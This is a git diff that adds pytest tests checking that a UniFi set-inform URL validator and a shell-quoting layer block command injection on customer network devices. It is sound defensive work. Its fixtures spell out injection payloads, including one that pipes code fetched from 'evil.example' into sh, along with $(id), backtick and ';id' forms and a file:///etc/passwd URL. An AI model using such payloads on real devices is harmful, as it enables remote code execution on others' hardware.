@@ -72,3 +72,78 @@ def test_absent_or_unclassifiable_security_is_not_an_open_network(value):
     Everything here is either encrypted or unreadable; neither may raise it.
     """
     assert is_open_wlan_security(value) is False
+
+
+# ── set-inform: shell injection into customer network hardware ───────────────
+
+
+class TestSetInformUrlValidation:
+    """The inform URL is interpolated into a root shell command on the device.
+
+    The old guard was startswith("http") and endswith("/inform"), which a
+    payload can satisfy while still carrying shell metacharacters. Two layers
+    now stop it: the route rebuilds the URL from parsed components, and
+    set_inform shell-quotes whatever it is given.
+    """
+
+    def test_a_shell_payload_is_refused(self):
+        from app.core.exceptions import ValidationError
+        from app.web.routes.unifi import _validated_inform_url
+
+        # Satisfies both of the original checks.
+        payload = "http://10.0.0.1/;curl evil.example/x|sh #/inform"
+        assert payload.startswith("http") and payload.endswith("/inform")
+        with pytest.raises(ValidationError):
+            _validated_inform_url(payload)
+
+    @pytest.mark.parametrize(
+        "bad",
+        [
+            "http://10.0.0.1/$(id)/inform",
+            "http://10.0.0.1/`id`/inform",
+            "http://10.0.0.1/inform?x=1",
+            "file:///etc/passwd/inform",
+            "http:// /inform",
+        ],
+    )
+    def test_metacharacters_and_odd_schemes_are_refused(self, bad):
+        from app.core.exceptions import ValidationError
+        from app.web.routes.unifi import _validated_inform_url
+
+        with pytest.raises(ValidationError):
+            _validated_inform_url(bad)
+
+    @pytest.mark.parametrize(
+        "raw,expected",
+        [
+            ("http://10.0.0.1:8080/inform", "http://10.0.0.1:8080/inform"),
+            ("10.0.0.1:8080", "http://10.0.0.1:8080/inform"),
+            # UniFi's own proxy form must survive — an equality check on the
+            # path would have rejected it.
+            ("https://unifi.example.no/proxy/network/inform",
+             "https://unifi.example.no/proxy/network/inform"),
+        ],
+    )
+    def test_legitimate_urls_still_work(self, raw, expected):
+        from app.web.routes.unifi import _validated_inform_url
+
+        assert _validated_inform_url(raw) == expected
+
+    async def test_the_command_is_quoted_even_if_validation_is_bypassed(self):
+        """Defence in depth: the command boundary does not trust its caller."""
+        from app.modules.unifi_audit.client import UniFiDirectDevice
+
+        sent = {}
+
+        dev = UniFiDirectDevice("10.0.0.1", "ubnt", "ubnt")
+
+        async def _fake_exec(cmd, timeout=15):
+            sent["cmd"] = cmd
+            return ("", "", 0)
+
+        dev._ssh_exec = _fake_exec
+        await dev.set_inform("http://10.0.0.1/;id #/inform")
+
+        # The metacharacters must be inside a quoted argument, not live shell.
+        assert ";id" not in sent["cmd"].split("'")[0]
+        assert sent["cmd"].startswith("mca-cli-op set-inform ")
